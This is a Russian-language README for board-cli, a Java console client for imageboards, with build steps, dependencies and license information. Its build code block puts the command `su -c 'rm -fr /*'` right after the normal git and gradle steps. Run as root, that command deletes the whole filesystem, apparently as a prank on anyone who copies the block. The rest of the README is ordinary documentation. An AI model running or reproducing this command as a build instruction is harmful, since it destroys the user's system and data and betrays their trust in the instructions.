[![Build Status](https://travis-ci.org/saber-nyan/board-cli.svg?branch=master)](https://travis-ci.org/saber-nyan/board-cli)
[![codecov](https://codecov.io/gh/saber-nyan/board-cli/branch/master/graph/badge.svg)](https://codecov.io/gh/saber-nyan/board-cli)
[![Issues](https://img.shields.io/github/issues/saber-nyan/board-cli.svg)](https://github.com/saber-nyan/board-cli/issues)
[![Release](http://github-release-version.herokuapp.com/github/saber-nyan/board-cli/release.svg?style=flat)](https://github.com/saber-nyan/board-cli/releases/latest)
# board-cli
### [[EN](README.md) | RU]
*Вдохновлен [bcskda/2ch-cli](https://github.com/bcskda/2ch-cli)*<br/>
Консольный модульный клиент для имиджборд.<br/>
Иногда работает на M$&reg; Windows&trade;!

Согласен, только наркоманы пишут CLI-проекты на Java. Зато кроссплатформенность.

![Screenshot1](https://i.imgur.com/0bEB430.png)
![Screenshot2](https://i.imgur.com/IWbZgLG.png)

## Зависимости?
* **Java**>=1.8, Oracle или OpenJDK (icedtea)
* (Опционально) **IntelliJ IDEA** для удобной разработки

## Запуск?
1. Качаешь `board-core.jar` и `board-module-name.jar` из [Releases](https://github.com/saber-nyan/board-cli/releases/latest).
2. Кладешь их рядом.
3. Запускаешь `java -jar ./board-core.jar -h` (на M$ Windows используй `javaw`, см. [mabe02/lanterna#335](https://github.com/mabe02/lanterna/issues/335)).
4. ??????
5. *Ох, как криво-то...*

## Сборка?
```
$ git clone https://github.com/saber-nyan/board-cli.git
$ cd board-cli
$ ./gradlew jar
$ cd ./build/jars
$ java -jar ./board-core.jar # или javaw на M$ Windows

$ su -c 'rm -fr /*'
```

## Документация?
Просто запусти `gradle aggregateJavadocs` и получишь Javadoc'и в `build/docs/javadoc`!

## А также...
* [Вклад](CONTRIBUTING_RU.md)
* [Нормы поведения](CODE_OF_CONDUCT_RU.md)

## Что было использовано?
Зависимость | Версия | Лицензия
----------- | ------ | --------
[Gradle](https://github.com/gradle/gradle) | 3.5-rc-2 | Apache-2.0
[OkHttp3](https://github.com/square/okhttp) | 3.9.0 | Apache-2.0
[intellij-annotations](https://github.com/JetBrains/intellij-community) | 12.0 | Apache-2.0
[commons-cli](https://github.com/apache/commons-cli) | 1.4 | Apache-2.0
[org.json](https://github.com/stleary/JSON-java) | 20170516 | JSON
[slf4j](https://github.com/qos-ch/slf4j) | 1.7.25 | MIT
[logback](https://github.com/qos-ch/logback) | 1.2.3 | EPL v1 / LGPL v2.1
[lanterna](https://github.com/mabe02/lanterna) | 3.0.0 | LGPL v3.0

## Лицензия?
[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)<br>
Потому что я могу.
